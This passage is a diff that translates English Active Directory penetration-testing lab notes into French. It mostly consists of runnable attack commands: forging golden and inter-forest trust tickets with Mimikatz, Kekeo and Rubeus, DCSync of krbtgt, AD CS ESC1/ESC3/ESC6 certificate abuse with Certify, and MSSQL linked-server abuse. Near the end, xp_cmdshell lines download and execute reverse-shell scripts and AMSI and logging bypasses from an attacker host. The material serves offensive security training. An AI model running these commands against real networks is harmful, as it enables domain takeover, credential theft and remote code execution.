+**Injecter le TGS puis accéder au partage distant**
+
 ```powershell
 .\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
 
-> Tickets for other services (like **HOST** and **RPCSS for WMI**, **HTTP for PowerShell Remoting** and **WinRM**) can be created as well.
+Les notes citent également les services `HOST` et `RPCSS` pour WMI, ainsi que `HTTP` pour PowerShell Remoting et WinRM.
 
+#### Utilisation de Rubeus
 
-**Abuse with Rubeus**
+Le TGT inter-royaume forgé précédemment est réutilisé pour demander un TGS :
 
-Note that we are still using the TGT forged initially:
 ```powershell
 Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt 
 ls \\mcorp-dc.moneycorp.local\c$
 ```
 
-Learning Objective 18
+**Objectif du laboratoire 18**
 
-- Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.
+- À partir d'un accès Domain Admin sur `dollarcorp.moneycorp.local`, étudier l'élévation vers Enterprise Admin ou Domain Admin dans le domaine parent `moneycorp.local` à l'aide de la clé de confiance.
 
+### Child to Parent - Hash du compte krbtgt
 
-### Child to Parent using krbtgt hash
+Cette variante repose sur le secret du compte `krbtgt` du domaine enfant et sur l'utilisation de `sIDHistory` pour représenter un groupe privilégié du domaine parent.
 
-We will abuse sIDhistory once again:
+**Récupérer le secret et préparer le ticket**
+
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-	5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
 ```
 
-> In the above command, the mimkatz option **/sids** is forcefully setting the **sIDHistory** for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group.
+**Injecter le ticket et accéder aux services du domaine parent**
 
-On any machine of the current domain:
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
 ls \\mcorp-dc.moneycorp.local.kirbi\c$ 
@@ -603,110 +581,102 @@ gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
 ```
 
-Avoid suspicious logs by using Domain Controllers group:
+**Variante utilisant l'identité d'un contrôleur de domaine**
+
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9  /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
 
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
 ```
 
-> S-1-5-21-2578538781-2508153159-3419410681-516 - Domain Controllers
-> S-1-5-9 - Enterprise Domain Controllers
+Les SID cités dans les notes correspondent aux groupes suivants :
 
+- `S-1-5-21-2578538781-2508153159-3419410681-516` : Domain Controllers.
+- `S-1-5-9` : Enterprise Domain Controllers.
 
-Learning Objective 19
+**Objectif du laboratoire 19**
 
-- Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.
+- À partir d'un accès Domain Admin sur `dollarcorp.moneycorp.local`, étudier l'élévation vers Enterprise Admin ou Domain Admin dans le domaine parent `moneycorp.local` à l'aide du hash `krbtgt` du domaine enfant.
 
+### Trust inter-forêts
 
+Les illustrations présentent le flux d'approbation entre deux forêts et les possibilités d'accès aux ressources de la forêt distante.
 
+![Trust flow inter-forêts](./assets/23.png)
 
-## Trust Flow Across Forest
+![Abus de confiance inter-forêts](./assets/24.png)
 
-![Alt text](./assets/23.png)
+**Récupérer la clé de confiance inter-forêts**
 
-
-
-Trust Abuse Across Forest
-
-![Alt text](./assets/24.png)
-
-
-
-
-
-## Across Forest using Trust Tickets
-
-Once again, we require the trust key for the inter-forest trust:
 ```powershell
    → Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 ```
-Or
+
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 ```
-Or
+
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\euvendor$"'
 ```
 
-An inter-forest TGT can be forged:
+**Forger un TGT inter-forêts**
+
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:2756bdf7dd8ba8e9c40fe60f654115a0 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
 ```
 
-**Abuse with Kekeo**
+#### Utilisation de Kekeo
 
-Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket:
+**Demander un TGS pour un partage de la forêt distante**
+
 ```powershell
 .\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
 ```
 
-Use the TGS to access the targeted service:
+**Injecter le ticket puis accéder au partage**
+
 ```powershell
 .\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
 ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 ```
 
-> Tickets for other services (like **HOST** and **RPCSS for WMI**, **HTTP for PowerShell Remoting** and **WinRM**) can be created as well
+#### Utilisation de Rubeus
 
+Réutiliser le TGT forgé pour demander un TGS sur le serveur distant :
 
-**Abuse with Rubeus**
-
-Using the same TGT which we forged earlier:
 ```powershell
 Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
 ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 ```
+
+**Énumérer les partages du domaine**
 
 ```powershell
 net view \\<domain>  
 # This can enum the shares
 ```
 
-Learning Objective 20
+**Objectif du laboratoire 20**
 
-- With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest
+- Avec des privilèges Domain Admin sur `dollarcorp.moneycorp.local`, accéder au partage `SharedwithDCorp` du contrôleur de domaine de la forêt `eurocorp.local`.
 
+## Active Directory Certificate Services (AD CS)
 
+AD CS fournit les services d'infrastructure à clés publiques (PKI) dans Active Directory. Les certificats peuvent être utilisés pour l'authentification, le chiffrement et la signature.
 
-# Across domain trusts - AD CS
-Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.
+Notions à connaître :
 
-- AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.
-- AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization.
+- **CA (Certification Authority)** : autorité de certification qui délivre les certificats.
+- **Certificate** : certificat délivré à un utilisateur ou à une machine.
+- **CSR (Certificate Signing Request)** : demande de certificat envoyée par un client à l'autorité.
+- **Certificate Template** : modèle qui définit les paramètres du certificat, les droits d'inscription, les usages et la durée de validité.
+- **EKU (Extended Key Usage)** : usages autorisés pour le certificat, identifiés par des OID.
 
-- CA - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.
-- Certificate - Issued to a user or machine and can be used for authentication, encryption, signing etc.
-- CSR - Certificate Signing Request made by a client to the CA to request a certificate.
-- Certificate Template - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.
-- EKU OIDs - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)
+![AD CS - PKI](./assets/25.png)
 
-![Alt text](./assets/25.png)
+Les notes recensent plusieurs catégories d'abus possibles :
 
-
-
-There are various ways of abusing ADCS! (See the link to "Certified Pre-Owned" paper in slide notes):
 ```
 - Extract user and machine certificates
 - Use certificates to retrieve NTLM hash
@@ -715,35 +685,32 @@ There are various ways of abusing ADCS! (See the link to "Certified Pre-Owned" p
 - Domain persistence
 ```
 
-> We will not discuss all of the techniques!
+![AD CS - Schéma](./assets/26.png)
 
-![Alt text](./assets/26.png)
+![AD CS - Schéma](./assets/27.png)
 
-![Alt text](./assets/27.png)
+**Énumérer les autorités de certification avec Certify**
 
+[Certify sur GitHub](https://github.com/GhostPack/Certify)
 
-
-
-We can use the Certify tool to enumerate (and for other attacks) AD CS in the target forest:
-
-[Certify on GitHub](https://github.com/GhostPack/Certify)
 ```powershell
 Certify.exe cas
 ```
 
-Enumerate the templates:
+**Énumérer les modèles de certificats**
+
 ```powershell
 Certify.exe find
-```powershell
+```
 
-Enumerate vulnerable templates:
+**Rechercher les modèles vulnérables**
+
 ```powershell
 Certify.exe find /vulnerable
 ```
 
-- In moneycorp, there are multiple misconfigurations in AD CS.
+Les notes indiquent plusieurs prérequis communs aux scénarios ESC1, ESC3 et ESC6 :
 
-Common requirements/misconfigurations for all the Escalations that we have in the lab (ESC1, ESC3 and ESC6):
 ```
 - CA grants normal/low-privileged users enrollment rights
 - Manager approval is disabled
@@ -751,193 +718,238 @@ Common requirements/misconfigurations for all the Escalations that we have in th
 - The target template grants normal/low-privileged users enrollment rights
 ```
 
+Ces éléments doivent être vérifiés sur l'autorité de certification et sur le modèle ciblé avant de conclure à une configuration exploitable.
+
 ### AD CS - ESC3
 
+Le scénario ESC3 repose sur deux modèles :
 
-The template **SmartCardEnrollment-Agent** allows Domain users to enroll and has **Certificate Request Agent** EKU:
+- `SmartCardEnrollment-Agent` permet aux utilisateurs du domaine de s'inscrire et possède l'EKU `Certificate Request Agent`.
+- `SmartCardEnrollment-Users` impose une exigence de stratégie d'émission liée à Certificate Request Agent et autorise l'authentification du domaine.
+
+**Identifier le modèle Agent vulnérable**
+
 ```powershell
 Certify.exe find /vulnerable
 ```
 
-The template **SmartCardEnrollment-Users** has an Application Policy Issuance Requirement of Certificate Request Agent and has an EKU that allows for domain authentication. Search for domain authentication EKU:
+**Rechercher les modèles disposant de l'EKU Client Authentication**
+
 ```powershell
 Certify.exe find /json /outfile:C:\AD\Tools\file.json ((Get-Content C:\AD\Tools\file.json | ConvertFrom-Json).CertificateTemplates | ? {$_.ExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2"}) | fl *
 ```
 
-### Escalation to DA
-We can now request a certificate for Certificate Request Agent from **SmartCardEnrollment-Agent** template:
+#### Élévation vers Domain Admin
+
+**Demander un certificat Certificate Request Agent**
+
 ```powershell
 Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA/template:SmartCardEnrollment-Agent
 ```
 
-Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of DA using the **SmartCardEnrollment-Users** template:
+Le certificat reçu est ensuite converti au format PFX. Les notes utilisent le fichier `esc3agent.pfx` pour la demande suivante.
+
+**Demander un certificat au nom du compte Administrator du domaine**
+
 ```powershell
 Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA/template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
 ```
 
-Convert from cert.pem to pfx (esc3user-DA.pfx below), request DA TGT and inject it:
+Le certificat obtenu est converti en PFX, puis utilisé pour demander un TGT du compte ciblé :
+
 ```powershell
 Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt
 ```
 
-### Escalation to EA
-Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of EA using the **SmartCardEnrollment-Users** template:
+#### Élévation vers Enterprise Admin
+
+**Demander un certificat au nom du compte Administrator du domaine parent**
+
 ```powershell
 Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
-```	
+```
 
-Request EA TGT and inject it:
+**Demander le TGT Enterprise Admin et l'injecter**
+
 ```powershell
 Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
 ```
 
-
 ### AD CS - ESC6
 
-The CA in moneycorp has **EDITF_ATTRIBUTESUBJECTALTNAME2** flag set. This means that we can request a certificate for ANY user from a template that allow enrollment for normal/low-privileged users:
+Le scénario ESC6 concerne une autorité de certification dont le flag `EDITF_ATTRIBUTESUBJECTALTNAME2` est activé. Les notes indiquent qu'il devient alors possible de demander un certificat pour un autre utilisateur à partir d'un modèle autorisant l'inscription des utilisateurs concernés.
+
+**Énumérer les modèles et les paramètres de l'autorité**
+
 ```powershell
 Certify.exe find
 ```
 
-The template **CA-Integration** grants enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx:
+Le modèle `CA-Integration` accorde le droit d'inscription au groupe `RDPUsers` dans le laboratoire.
+
+**Demander un certificat avec le nom alternatif du compte Administrator**
+
 ```powershell
 Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:administrator
 ```
 
-Convert from cert.pem to pfx (esc6.pfx below) and use it to request a TGT for DA (or EA):
+**Utiliser le certificat pour demander un TGT**
+
 ```powershell
 Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass@123 /ptt
 ```
 
 ### AD CS - ESC1
-	
-The template **HTTPSCertificates** has **ENROLLEE_SUPPLIES_SUBJECT** value for **msPKI-Certificates-Name-Flag**:
+
+Le modèle `HTTPSCertificates` possède la valeur `ENROLLEE_SUPPLIES_SUBJECT` dans l'attribut `msPKI-Certificates-Name-Flag`. Les notes indiquent que le groupe `RDPUsers` dispose du droit d'inscription sur ce modèle.
+
+**Identifier les modèles autorisant la fourniture du sujet par le demandeur**
+
 ```powershell
 Certify.exe find /enrolleeSuppliesSubject
 ```
 
-The template **HTTPSCertificates** allows enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx:
+**Demander un certificat avec le nom alternatif du compte Administrator**
+
 ```powershell
 Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
 ```
 
-Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or EA):
+**Utiliser le certificat pour demander un TGT**
+
 ```powershell
 Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
 ```
 
-Learning Objective 21
+**Objectif du laboratoire 21**
 
-- Check if AD CS is used by the target forest and find any vulnerable/abusable templates.
-- Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.
+- Vérifier si AD CS est déployé dans la forêt cible.
+- Identifier les modèles de certificats vulnérables ou abusables.
+- Étudier les scénarios d'élévation vers Domain Admin et Enterprise Admin.
 
+## Abus des serveurs MSSQL
 
+Les serveurs Microsoft SQL Server sont fréquemment présents dans les domaines Windows. Les droits d'accès aux bases de données peuvent être associés à des comptes Active Directory, et les liens entre serveurs SQL peuvent permettre d'accéder à d'autres instances.
 
-# Trust Abuse - MSSQL Servers
-MS SQL servers are generally deployed in plenty in a Windows domain.
+Les notes utilisent **PowerUpSQL** pour la découverte et l'énumération.
 
-- SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.
-- For MSSQL and PowerShell hackery, lets use PowerUpSQL
+[PowerUpSQL sur GitHub](https://github.com/NetSPI/PowerUpSQL)
 
-[PowerUpSQL on GitHub](https://github.com/NetSPI/PowerUpSQL)
+**Découvrir les instances SQL du domaine**
 
-
-
-Discovery (SPN Scanning):
 ```powershell
 Get-SQLInstanceDomain
 ```
 
-Check Accessibility:
+**Tester l'accessibilité des instances**
+
 ```powershell
 Get-SQLConnectionTestThreaded
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
 ```
 
-Gather Information:
+**Collecter les informations sur les serveurs SQL**
+
 ```powershell
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 ```
 
-## MSSQL Servers - Database Links
-A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.
+### Database Links
 
-- In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.
-- Database links work even across forest trusts.
+Un Database Link permet à un serveur SQL d'accéder à une source de données externe, notamment une autre instance SQL Server.
 
-**Searching Database Links**
+Les notes rappellent que :
 
-Look for links to remote servers:
+- Les liens entre serveurs SQL peuvent permettre l'exécution de procédures stockées sur le serveur distant.
+- Les liens peuvent également fonctionner au travers de relations d'approbation entre forêts.
+- Plusieurs liens peuvent être imbriqués : une instance peut pointer vers une autre instance, elle-même liée à une troisième.
+
+**Rechercher les liens vers des serveurs distants**
+
+Avec PowerUpSQL :
+
 ```powershell
 Get-SQLServerLink -Instance dcorp-mssql -Verbose
 ```
-Or
+
+Avec une requête SQL :
+
 ```powershell
 select * from master..sysservers
 ```
 
-**Enumerating Database Links - Manually**
+**Interroger un serveur lié avec OPENQUERY**
 
-**Openquery()** function can be used to run queries on a linked database:
 ```powershell
 select * from openquery("dcorp-sql1",'select * from master..sysservers')
 ```
 
-Enumerating Database Links:
+**Énumérer les liens SQL avec PowerUpSQL**
+
 ```powershell
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
 ```
-or
 
-Openquery queries can be chained to access links within links (nested links)
+**Enchaîner plusieurs liens avec OPENQUERY**
+
 ```powershell
 select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')
 ```
 
-**Executing Commands**
+### Exécution de commandes via les liens SQL
 
-On the target server, either **xp_cmdshell** should be already enabled; or If **rpcout is enabled** (disabled by default), **xp_cmdshell** can be enabled using:
+L'exécution de commandes système dépend notamment de la configuration de `xp_cmdshell` et de `rpcout`. Les notes précisent que `rpcout` est désactivé par défaut et présentent son activation lorsque les conditions le permettent.
+
+**Configurer xp_cmdshell sur l'instance distante**
+
 ```powershell
 EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
 ```
 
-**Executing Commands**
+**Exemple de requête imbriquée pour interroger la version SQL et appeler xp_cmdshell**
 
-From the initial SQL server, OS commands can be executed using nested link queries:
 ```powershell
 select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
 ```
 
-**Abusing Database Links**
+**Cartographier les liens depuis l'instance us-mssql**
 
-Crawling links to remote servers:
 ```powershell
 Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local
 ```
 
-Abusing links to remote servers (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain)
+**Cibler une instance précise avec QueryTarget**
+
 ```powershell
 Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''whoami''' -QueryTarget db-sqlsrv
 ```
 
-**Executing Commands**
+**Exécuter une requête sur l'instance eu-sql**
 
-Use the -QuertyTarget parameter to run Query on a specific instance (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain):
 ```powershell
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
 ```
 
-From the initial SQL server, OS commands can be executed using nested link queries:
+**Exemple d'exécution via plusieurs liens imbriqués**
+
 ```powershell
 select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
 ```
 
-Learning Objective 22
+**Objectif du laboratoire 22**
 
-- Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql
+- Obtenir un accès à un serveur SQL de la forêt `eurocorp` en étudiant l'abus des Database Links depuis `dcorp-mssql`.
 
+**Dernier exemple présent dans les notes source**
+
+Le dernier bloc source est incomplet : il est conservé pour ne pas perdre l'extrait, mais ne doit pas être exécuté tel quel sans retrouver la suite de la commande d'origine.
 
 ```powershell
 Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/Invoke-PowerShellTcpEx.ps1)
 ```
 
+## Points de vigilance sur les notes source
+
+- Les commandes et leurs paramètres sont conservés depuis le document d'origine ; certains noms de comptes, chemins et secrets sont propres au laboratoire.
+- Quelques extraits semblent contenir des erreurs de syntaxe ou des éléments incomplets. Ils sont signalés plutôt que corrigés silencieusement.
+- Les 13 illustrations du chapitre source sont conservées.
